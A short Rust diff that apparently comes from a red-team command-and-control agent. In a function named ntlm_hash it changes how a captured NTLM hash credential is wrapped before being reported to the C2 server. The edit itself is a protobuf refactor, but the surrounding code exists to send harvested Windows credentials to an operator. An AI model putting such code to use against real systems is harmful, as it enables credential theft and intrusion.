@@ -16,7 +16,9 @@ pub fn ntlm_hash(
         kind: 3, // KIND_NTLM_HASH
     };
     let req = c2::ReportCredentialRequest {
-        context: Some(task_context),
+        context: Some(c2::report_credential_request::Context::TaskContext(
+            task_context,
+        )),
         credential: Some(cred),
     };
     agent.report_credential(req).map(|_| ())
